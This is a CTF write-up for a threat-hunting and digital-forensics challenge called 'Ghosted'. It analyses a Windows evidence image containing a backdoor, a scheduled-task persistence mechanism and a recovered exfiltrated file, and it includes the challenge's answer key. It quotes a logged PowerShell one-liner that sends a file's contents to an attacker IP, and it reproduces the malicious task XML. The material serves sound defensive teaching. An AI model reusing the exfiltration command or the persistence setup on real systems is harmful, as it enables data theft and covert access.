# CyberTalents - Threat Hunting: "Ghosted" Writeup

**Author:** Immortal_ibr

**Category:** Threat Hunting / Digital Forensics

**Platform:** CyberTalents

**Artifact Format:** AccessData AD1 Custom Content Image

**Difficulty:** Easy

## 1. Executive Summary

During an incident response engagement on an endpoint attributed to user `Immortal_ibr` (`DESKTOP-MMN0N2M`), threat hunting teams identified anomalous persistence and data staging activities. Digital forensic triage was conducted using an AccessData logical evidence container (`Image.ad1`).

The investigation revealed that an adversary gained initial footprint on the workstation, staged a reverse-shell binary masquerading as `update.exe` under user documents, and established persistence using a scheduled task dubbed `Updater` configured with a `LogonTrigger`. Furthermore, examination of Windows PowerShell operational logs confirmed an attempted data exfiltration routine utilizing `Invoke-WebRequest` to transfer a sensitive staging document (`secure.txt`). Although the attacker attempted anti-forensics by removing user-profile directories from typical browsing views, low-level NTFS Master File Table (`$MFT`) record analysis enabled raw file carvers to recover the exact exfiltrated payload from the MFT resident `$DATA` stream.

## 2. Challenge Questions & Answers

| \# | Question | Answer | 
| ----- | ----- | ----- | 
| **Q1** | What is the IP address of the attacker (IP)? | `192.168.31.132` | 
| **Q2** | What is the full path of the file the attacker exfiltrated? | `C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt` | 
| **Q3** | What is the exact content of the exfiltrated file? | `very_important_piece_of_information` | 
| **Q4** | What is the full path of the installed backdoor? | `C:\Users\Immortal_ibr\Documents\update.exe` | 
| **Q5** | What is the name of the malicious thing the attacker used for peresistance? | `Updater` | 
| **Q6** | What is the Mitre technique that the attacker used in peresistance? | `T1053.005` | 
| **Q7** | What is the trigger of the schedule task? | `LogonTrigger` | 

## 3. Forensic Environment & Tools

* **FTK Imager (v8.3.0+)**: Logical AD1 mounting, hex inspection, metadata parsing.

* **Windows Event Viewer / EvtxECmd (Eric Zimmerman)**: EVTX log parsing.

* **PowerShell / Python / strings**: Low-level stream carving and regex analysis.

* **MFTECmd**: Parsing NTFS `$MFT` structures.

## 4. Detailed Investigation Walkthrough

### Phase 1: Mounting and Triage of `Image.ad1`

The evidence file is supplied as an AccessData logical content container (`Image.ad1`). Adding this evidence item into **FTK Imager** reveals a targeted collection structure:

```
Image.ad1
└── Custom Content Image([Multi]) [AD1]
    └── C:\NONAME [NTFS]
        └── [root]
            ├── $Bitmap
            ├── $LogFile
            ├── $MFT
            ├── Users
            └── Windows

```

Inspecting `Users\Immortal_ibr\Downloads` identifies an installer binary:

* `Easy File Sharing Web Server.exe`

This indicates the host was potentially vulnerable to known remote buffer overflow or unauthenticated exploits associated with EFSWS.

### Phase 2: Persistence & Backdoor Identification (Q4, Q5, Q6, Q7)

#### 1. Locating the Backdoor

Navigating to `Users\Immortal_ibr\Documents\` reveals a suspicious portable executable (PE) file:

* **File Name:** `update.exe`

* **Full Path:** `C:\Users\Immortal_ibr\Documents\update.exe`

* **Size:** \~73 KB

Inspecting `update.exe` via PE header and string analysis reveals that it is based on ApacheBench/native networking stubs modified with an embedded shellcode stager utilizing `ws2_32.dll`.

#### 2. Identifying Persistence Mechanism

Threat actors routinely leverage Scheduled Tasks for persistence. Examining task definitions in:
`Windows\System32\Tasks\`

Reveals an unregistered or non-standard scheduled task XML definition named **`Updater`**.

```
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\Immortal_ibr\Documents\update.exe</Command>
    </Exec>
  </Actions>
</Task>

```

#### Analytical Findings:

* **Backdoor Path:** `C:\Users\Immortal_ibr\Documents\update.exe`

* **Persistence Name:** `Updater`

* **MITRE ATT&CK Technique:** `T1053.005` (Scheduled Task/Job: Scheduled Task)

* **Trigger Type:** `LogonTrigger`

### Phase 3: Exfiltration Vector & Attacker IP (Q1, Q2)

To trace command-line executions and data egress, Windows Event Logs were extracted from:
`Windows\System32\winevt\Logs\`

Specifically, **`Microsoft-Windows-PowerShell%4Operational.evtx`** was examined for ScriptBlock Logging (`Event ID 4104`) and execution pipeline failures (`Event ID 4100`).

Under events logged on **8/14/2025 at 4:44:45 AM**, an alert captures an anomalous network request failure:

```
Error Message = The underlying connection was closed: An unexpected error occurred on a send.
Fully Qualified Error ID = WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

Context:
    Host Application = powershell.exe Invoke-WebRequest https://192.168.31.132:8080/?ex=$(Get-Content C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt)
    User = DESKTOP-MMN0N2M\Immortal_ibr

```

#### Analytical Findings:

1. **Attacker C2 / Exfiltration Endpoint:** `192.168.31.132` (listening on port `8080`).

2. **Target File for Exfiltration:** `C:\Users\Immortal_ibr\Desktop\Important docs\secure.txt`.

### Phase 4: Recovering the Exfiltrated File via `$MFT` Carving (Q3)

When attempting to browse `Users\Immortal_ibr\Desktop` in the logical explorer, the folder does not appear in the directory hierarchy because the AD1 extraction scope only acquired targeted directories, or the file was deleted post-exfiltration.

However, the file system metadata record persists inside the Master File Table (`$MFT`), located at the root of the NTFS partition:
`C:\NONAME [NTFS]\[root]\$MFT` (Size: \~110 MB).

#### Low-Level NTFS Architecture: Resident Attributes

In NTFS, if a file is smaller than approximately 700–800 bytes, its payload is stored directly inside the 1024-byte MFT record itself under the **`$DATA`** attribute (Type ID `0x80`). This is known as a **Resident File**.

#### Carving Steps:

1. Open `$MFT` in **FTK Imager** and switch to **HEX View**.

2. Perform a Unicode string search for `secure.txt`:

```
73 00 65 00 63 00 75 00 72 00 65 00 2E 00 74 00 78 00 74 00  (s.e.c.u.r.e...t.x.t)

```

The initial hit resolves to an LNK file artifact (`secure.txt.lnk`). Continuing search (`F3` / Next Hit) locates the dedicated file record:

```
Offset 6875cf0:  0A 03 73 00 65 00 63 00-75 00 72 00 65 00 2E 00  ..s.e.c.u.r.e..
Offset 6875d00:  74 00 78 00 74 00 00 00-40 00 00 00 28 00 00 00  t.x.t...@...(
Offset 6875d30:  80 00 00 00 40 00 00 00-00 00 18 00 00 00 01 00  €...@...........
Offset 6875d40:  23 00 00 00 18 00 00 00-76 65 72 79 5F 69 6D 70  #.......very_imp
Offset 6875d50:  6F 72 74 61 6E 74 5F 70-69 65 63 65 5F 6F 66 5F  ortant_piece_of_
Offset 6875d60:  69 6E 66 6F 72 6D 61 74-69 6F 6E 00 65 00 77 00  information.e.w.

```

#### Parsing Breakdown:

* **Offset `6875cf2`:** Filename attribute (`$FILE_NAME`) `secure.txt`.

* **Offset `6875d30`:** `$DATA` attribute header (`0x80 00 00 00`).

* **Offset `6875d48`:** Resident string payload:
  `very_important_piece_of_information`

## 5. MITRE ATT&CK Matrix Mapping

| Tactic | Technique ID | Technique Name | Evidence | 
| ----- | ----- | ----- | ----- | 
| **Persistence** | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task | Malicious task `Updater` registered with `LogonTrigger`. | 
| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell | `powershell.exe Invoke-WebRequest ...` logged in Event ID 4104. | 
| **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) | Data from Local System | `Get-Content` reading `C:\...\secure.txt`. | 
| **Exfiltration** | [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | Outbound HTTPS request to `192.168.31.132:8080`. | 
| **Defense Evasion** | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Masquerading: Match Legitimate Name | Staging binary named `update.exe` in user profile. | 

## 6. Key Takeaways & Detection Engineering

1. **PowerShell ScriptBlock Logging is Invaluable:**

   Without Event ID 4104 enabled, the exact staging path and destination IP could only be recovered from network pcaps or memory captures. Enabling script block logging ensures visibility into encapsulated variables (`$(Get-Content ...)`).

2. **NTFS Metadata Preserves "Ghosted" Files:**

   Even if target directories are deleted or excluded from partial image captures, the `$MFT` retains metadata and resident data until overwritten by active disk writes.

3. **Scheduled Task Auditing:**

   Tasks dropping executables in user-writable spaces (`AppData`, `Documents`, `Temp`) with user-logon triggers represent strong indicators of compromise (IoC).